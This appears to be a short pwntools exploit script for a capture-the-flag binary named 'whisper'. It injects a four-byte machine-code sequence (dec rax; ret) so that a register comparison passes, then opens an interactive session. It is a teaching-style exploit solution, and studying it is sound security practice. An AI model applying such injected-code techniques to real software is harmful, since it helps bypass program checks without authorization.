from pwn import *

elf = ELF('./whisper')

io = elf.process()
pause()

#required instruction is : 0x48FFC8C3  # dec rax; ret;
#rax is 0xcafebabf after dec => 0xcafebabe now the check with rbx is valid 

instruction = b"\x48\xff\xc8\xc3"

io.sendline(instruction)

io.interactive()
